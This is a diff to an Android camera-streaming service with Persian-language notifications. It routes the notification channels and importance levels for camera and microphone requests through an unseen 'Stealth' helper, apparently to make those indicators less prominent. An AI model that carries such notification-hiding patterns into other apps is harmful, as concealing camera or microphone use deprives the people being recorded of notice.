@@ -291,6 +291,12 @@ public class CameraService extends Service {
         }
     }
 
+    /** بعد از تغییر کانال اعلان، اعلان فعلی را دوباره بفرست */
+    public static void repost() {
+        CameraService s = instance;
+        if (s != null) s.updateNotification();
+    }
+
     public static void setTorch(boolean on) {
         torch = on;
         CameraService s = instance;
@@ -317,12 +323,12 @@ public class CameraService extends Service {
         try {
             NotificationManager nm = (NotificationManager) c.getSystemService(NOTIFICATION_SERVICE);
             if (Build.VERSION.SDK_INT >= 26)
-                nm.createNotificationChannel(new NotificationChannel(CH + "_ask", "درخواست دوربین", NotificationManager.IMPORTANCE_HIGH));
+                nm.createNotificationChannel(new NotificationChannel(Stealth.askChannel(c, CH + "_ask"), "درخواست دوربین", Stealth.askImportance(c)));
             Intent i = new Intent(c, CameraService.class).setAction(micOnly ? ACTION_STANDBY : ACTION_START).putExtra("tap", true);
             int f = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
             PendingIntent pi = Build.VERSION.SDK_INT >= 26 ? PendingIntent.getForegroundService(c, 7, i, f)
                     : PendingIntent.getService(c, 7, i, f);
-            Notification.Builder b = Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(c, CH + "_ask") : new Notification.Builder(c);
+            Notification.Builder b = Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(c, Stealth.askChannel(c, CH + "_ask")) : new Notification.Builder(c);
             b.setSmallIcon(R.drawable.ic_stat)
                     .setContentTitle(micOnly ? "🎙 کامپیوتر می‌خواهد صدای گوشی را بشنود" : "📷 کامپیوتر می‌خواهد دوربین را ببیند")
                     .setContentText(micOnly ? "برای روشن کردن میکروفون لمس کنید" : "برای روشن کردن دوربین لمس کنید")
@@ -340,10 +346,7 @@ public class CameraService extends Service {
     public void onCreate() {
         super.onCreate();
         Diag.init(this);
-        if (Build.VERSION.SDK_INT >= 26) {
-            NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(new NotificationChannel(CH, "پخش دوربین", NotificationManager.IMPORTANCE_LOW));
-        }
+        Stealth.ensureChannels(this);
     }
 
     @Override
@@ -405,7 +408,7 @@ public class CameraService extends Service {
         PendingIntent stop = PendingIntent.getService(this, 8,
                 new Intent(this, CameraService.class).setAction(ACTION_STOP),
                 PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-        Notification.Builder b = Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(this, CH) : new Notification.Builder(this);
+        Notification.Builder b = Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(this, Stealth.fgsChannel(this, CH)) : new Notification.Builder(this);
         boolean live = camOpen || "starting".equals(state);
         boolean micLive = "on".equals(audioState);
         return b.setSmallIcon(R.drawable.ic_stat)
